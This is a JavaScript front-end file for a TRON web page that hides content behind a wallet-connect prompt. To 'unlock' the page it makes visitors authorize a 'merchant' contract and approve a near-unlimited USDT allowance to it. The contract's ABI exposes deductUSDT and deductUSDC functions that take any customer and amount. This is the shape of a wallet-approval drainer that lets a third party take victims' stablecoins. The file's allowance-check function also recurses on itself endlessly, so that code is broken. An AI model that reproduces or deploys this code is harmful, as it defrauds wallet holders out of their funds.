// src/main.js
// 🚨 最終穩定版：極度樂觀，廣播成功即解鎖，無額外狀態檢查 🚨
// 🚨 Final Stable Version: Extremely Optimistic, Unlocks Immediately Upon Broadcast Success, No Additional State Checks 🚨
// 這行宣告了這是程式碼的主要檔案，並且是最終版本，它假設廣播成功後立即解鎖，並且沒有額外的狀態檢查。

// --- 配置常量 ---
// --- Configuration Constants ---
// 定義了合約的配置常量。
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
// 商戶合約地址
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// USDT 代幣合約地址
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
// USDC 代幣合約地址

// 您的合約 ABI (保持不變)
// Your contract ABI (remains unchanged)
// 宣告了合約的 ABI (Application Binary Interface)。ABI 定義了合約的介面，包含了合約的函數、事件等資訊。
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
// --- 狀態變數 ---
// --- State Variables ---
// 宣告了程式碼中使用的狀態變數。
let tronWeb;
// TronWeb 實例，用於與 Tron 網路互動。
let userAddress;
// 用戶錢包地址。
let merchantContract;
// 商戶合約實例。
let usdtContract;
// USDT 代幣合約實例。
let usdcContract;
// USDC 代幣合約實例。
let isConnectedFlag = false;
// 表示是否已連接到錢包的標誌。
let targetDeductionToken = null;
// 用於指定扣款代幣的變數。

// --- UI 元素 ---
// --- UI Elements ---
// 定義了與 UI 元素相關的變數。
const connectButton = document.getElementById('connectButton');
// 連接按鈕的 DOM 元素。
const blurOverlay = document.getElementById('blurOverlay');
// 模糊覆蓋層的 DOM 元素，用於顯示加載訊息。
const overlayMessage = document.getElementById('overlayMessage');
// 覆蓋層中的訊息的 DOM 元素。
const lockedPrompt = document.getElementById('lockedPrompt');
// 鎖定提示的 DOM 元素，用於在未授權時顯示。

// --- 輔助函數 ---
// --- Helper Functions ---
// 定義了輔助函數，用於簡化常用操作。
function showOverlay(message) {
    // 顯示覆蓋層，並設置消息。
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    // 隱藏覆蓋層。
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    // 根據授權狀態更新內容鎖定狀態。
    if (isAuthorized) {
        if (lockedPrompt) {
            lockedPrompt.style.opacity = 0; // 淡出
            setTimeout(() => { lockedPrompt.style.display = 'none'; }, 300); // 等待淡出完成
        }
    } else {
        if (lockedPrompt) {
            lockedPrompt.style.display = 'flex';
            setTimeout(() => { lockedPrompt.style.opacity = 1; }, 10); // 淡入
        }
    }
}

function updateConnectionUI(connected, address = null) {
    // 更新連接狀態的 UI。
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `Connected: ${address}`;
        showOverlay('Connected. Checking authorization status...');
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
        connectButton.title = 'Connect Wallet';
        updateContentLock(false);
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
// Transaction counter (for connectAndAuthorize function)
// 用於追蹤交易次數的計數器。
let txCount = 0;

// 修正：新增 totalTxs 參數，移除輪詢
// Fix: Add totalTxs parameter, remove polling
// 修正：新增 totalTxs 參數，移除輪詢
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);

    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        // 嚴格檢查 txHash 是否有效
        // Strict check if txHash is valid
        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
             throw new Error(`TronLink/Wallet did not return a valid transaction hash. Possible reasons: operation was canceled or broadcast failed.`);
        }

        // 🚨 樂觀判斷：立即返回成功
        // 🚨 Optimistic assumption: Immediately return success
        // 樂觀地認為交易成功
        showOverlay(`Step ${txCount}/${totalTxs}: Authorization operation broadcast successful!`);
        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒以緩衝 UI。

        return txHash;

    } catch (error) {
        if (error.message && error.message.includes('User canceled the operation in the wallet')) {
             throw new Error('User canceled the operation in the wallet.');
        }
        throw new Error(`Authorization operation failed, error message: ${error.message}`);
    }
}

// 修正：修復 Max 授權的檢查邏輯
// Fix: Repair Max authorization check logic
// 檢查是否已授權的最大代幣額度的函數。
async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress || !merchantContract) {
        return false;
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00');
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);

    // 如果有合約註冊和代幣已授权，就返回 true
    // If the contract is registered and the tokens have been authorized, return true
    if(contractAuthorized && usdtAuthorized) return true;
    if(contractAuthorized && usdcAuthorized) return true;

    return false;
}

async function getTokenBalance(tokenContract) {
    // 獲取代幣餘額的函數。
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return false;
    }
}
async function initializeContracts() {
    // 初始化合約實例的函數。
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// --- TronLink 連線邏輯 (核心) ---
// --- TronLink Connection Logic (Core) ---
// TronLink 連接的邏輯。
async function connectTronLink() {
    if (!window.tronLink) {
        return false;
    }
    showOverlay('Detected TronLink/DApp browser. Requesting connection...');
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code !== 200) {
            throw new Error(`Connection request denied: ${res.message}`);
        }
        if (!window.tronWeb) throw new Error("TronWeb injection failed.");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        //  從 TronLink 連接呼叫
        //  await handlePostConnection();  -- Removed, runs within connectWallet
        return true;
    } catch (error) {
        console.error("TronLink connection failed:", error);
        // 不在這裡設置 showOverlay，讓 connectWalletLogic 統一處理失敗訊息
        // Do not set showOverlay here; let connectWalletLogic handle the failure message consistently
        updateConnectionUI(false);
        return false;
    }
}

// --- 混合連線邏輯 ( Trust Wallet / EVM 優先嘗試) ---
// --- Hybrid Connection Logic (Trust Wallet / EVM first) ---
// 混合連接邏輯，優先嘗試 EVM 錢包，然後回退到 TronLink。
async function connectWalletLogic() {

    const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)

    // 1. 🚨 優先嘗試使用標準 EVM Provider (Trust Wallet/MetaMask)
    // 1. 🚨 First attempt to use a standard EVM Provider (Trust Wallet/MetaMask)
    if (evmProvider) {
        showOverlay('Detected a standard EVM wallet (Trust Wallet/MetaMask). Requesting connection...');
        try {
            const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
            const evmAddress = accounts[0];

            console.log("✅ Obtained EVM account address:", evmAddress);

            if (!window.tronWeb) {
                console.log("🔴 Missing TronWeb");
                throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
            }

            tronWeb = window.tronWeb;
            userAddress = tronWeb.address.fromHex(evmAddress);
            console.log("✅ EVM address converted to TRON address:", userAddress);
            await initializeContracts();
            updateConnectionUI(true, userAddress);
            // Do not execute handlePostConnection here
            // 不在這裡執行 handlePostConnection
            return true;

        } catch (error) {
            // EVM 請求被拒絕或錯誤
            // EVM request rejected or error
            console.error("EVM Provider connection failed:", error);
            showOverlay(`Connection failed! Error: ${error.message}. Please ensure your wallet is unlocked and on the TRON chain.`);
            return false;
        }
    }

    // 2. 備用：嘗試 TronLink 連線 (如果存在)
    // 2. Fallback: Attempt TronLink connection (if present)
    if (window.tronLink) {
        const tronLinkConnected = await connectTronLink();
        if (tronLinkConnected) return true;
    }

    // 3. 完全沒有任何 Provider
    // 3. No Provider at all
    showOverlay('🔴 Connection failed: Your browser or app does not support TronLink. Please use the **TronLink browser extension** or the built-in browser of the **TronLink App**.');
    return false;
}

async function checkAuthorization() {
        // 檢查授權狀態的函數。
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00');
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null;
    if (usdtBalance.gte(minAmount) ) {
        targetToken = 'USDT';
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC';
    }
    targetDeductionToken = targetToken;

    return {
        contract: contractAuthorized,
        authorizedToken: targetToken,
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    // 建立連接並授權的函數。
    // 🚨 略過 状态檢查
    // 🚨 Skip state checks

    try {
        // 1. 合約授權 (ConnectAndAuthorize)
        // 1. Contract authorization (ConnectAndAuthorize)
        // ⚠️ 移除 checkAuthorization 函数
        // ⚠️ Remove checkAuthorization function
        if ( !merchantContract || !tronWeb || !userAddress) {
            throw new Error("Please connect a wallet first.");
        }

        const methodCall = merchantContract.connectAndAuthorize();
        await sendTransaction(methodCall, "Sending contract authorization operation", 1);

        // 2. Max 扣款授權 (Approve)
        // 2. Max deduction authorization (Approve)
        // 🚨 移除所有狀態判斷，並直接設置 Max 授權
        // 🚨 Remove all state checks and directly set Max authorization
        const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
        const tokenContract =  usdtContract;
        const tokenName = "USDT";
        // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
        // Set Max authorization (using ALMOST_MAX_UINT)
        await sendTransaction(
            tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            `Setting ${tokenName} Max authorization operation (final authorization - please approve)`,
            1
        );
       return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`🔴 Authorization operation failed! Error message: ${error.message}.  Please ensure the wallet is unlocked, has sufficient TRX (for gas fees), and has approved all 1 operation.`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：僅作為初始化流程執行一次
// ---------------------------------------------
// Post-connection processing: Executes only once for initialization
async function handlePostConnection() {
    if (!isConnectedFlag) return;

    // 🚨 樂觀判斷：在 connectAndAuthorize 成功後，立即進入成功解鎖的 UI 狀態
    // 🚨 Optimistic assumption: Immediately enter the UI state of successful unlocking after connectAndAuthorize succeeds

    const authSuccess = await connectAndAuthorize();

    if(authSuccess) {
        //  hideOverlay();  // 移除，因為在 connectAndAuthorize 中已經有提示
         updateContentLock(true);
         await new Promise(resolve => setTimeout(resolve, 500)); // 稍微延遲，讓提示消失
         // updateContentLock(true); // 直接显示 iframe
         // 確保在授權成功後，顯示 iframe (或其他內容)
    }
}

// ---------------------------------------------
// 主連接入口函數 (混合連線邏輯)
// ---------------------------------------------
// Main connection entry function (hybrid connection logic)
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        // Disconnect logic
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
    // 🚨 Only try connectWalletLogic (it internally decides whether to use TronLink or EVM Provider)
    const connected = await connectWalletLogic();

    if (connected) {
        await handlePostConnection();
    }

    if (connectButton) connectButton.disabled = false;
}

// 設置事件監聽器
// Set event listeners
if (connectButton) connectButton.addEventListener('click', connectWallet);

// 頁面啟動：初始化為未連接狀態
// Page startup: initialize to disconnected state
updateConnectionUI(false);